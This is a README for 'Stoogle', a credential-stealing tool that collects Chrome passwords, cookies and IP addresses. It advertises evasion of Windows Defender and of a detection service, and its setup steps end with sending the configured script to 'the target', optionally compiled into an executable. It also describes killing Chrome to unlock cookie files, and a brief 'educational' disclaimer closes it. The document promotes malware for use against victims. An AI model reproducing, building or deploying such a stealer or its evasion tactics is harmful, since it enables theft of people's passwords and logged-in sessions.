# Stoogle

**Stoogle** is a high-level information grabber engineered to **fully bypass Uncoverit**, enabling efficient and discreet data collection. It delivers extracted data in a clear, user-friendly format for rapid analysis.

---

## 🚫 Known Issues (MM/DD/YYYY)

- **06/05/2025** — Unpatched cookie logger present (Not yet uploaded)  
- **06/04/2025** — Cookie logger patched  

---

## ⚡ Key Features

- 🛰️ **Uncoverit Bypass:** Seamless and complete evasion of Uncoverit detection.  
- 🛡️ **Windows Defender Safe:** Avoids detection and flags by Windows Defender.  
- 🧰 **High-Level Data Extraction:** Quickly collects sensitive information with precision.  
- ⚙️ **User-Friendly:** Straightforward setup and usage.  
- 🔒 **Secure Implementation:** Not dual hooked, ensuring safer operation.  
- **Data Collected:**  
  - Chrome passwords  
  - Chrome cookies  
  - Device details including local and public IP addresses  

---

## 🚀 Getting Started

1. **Clone the repository:**
    ```bash
    git clone https://github.com/ILikeCodingg5565/Stoogle.git
    cd Stoogle
    ```

2. **Install dependencies:**
    ```bash
    pip install -r requirements.txt
    ```

3. **Run the setup script:**
    ```bash
    python setup.py
    ```

4. **Deployment:**
    - Send the configured `stoogle.py` script to the target.  
    - Optionally, compile it to an executable for easier distribution.  

---

## 🔧 Configuration

Customize the tool’s behavior by modifying and running the `config.py` file prior to deployment.

---

## ⚠️ Important Flags & Warnings

- Executables built with PyInstaller **may trigger antivirus alerts**, as some AV products automatically flag Python-generated EXEs.  
- Ongoing work is focused on mitigating these false positives.

---

## 🛠️ Changelog (MM/DD/YYYY)

- **06/04/2025:** Patched cookie stealer (kills Chrome to access cookies) — *Not yet uploaded*  
- **06/03/2025:** Attempted fixes for cookie access bug  
- **06/03/2025:** Initial upload of all project files to GitHub  
- **06/03/2025:** Completed script compilation  

---

## 🍪 Cookie Stealer Details

Accessing Chrome cookies while the browser is running is restricted without administrator privileges. The chosen approach involves terminating Chrome processes to unlock cookie access, circumventing the need for elevated rights.

---

## 🤝 Contributing

Contributions and improvements are welcome! Please submit issues or pull requests via the GitHub repository.

---

## 📄 License

This project is distributed under the [MIT License](LICENSE).

---

## ⚠️ Disclaimer

**Stoogle** is a **proof-of-concept tool** intended solely for **educational and research purposes**. Users must adhere strictly to all applicable laws and ethical guidelines.

---

Made with ❤️  
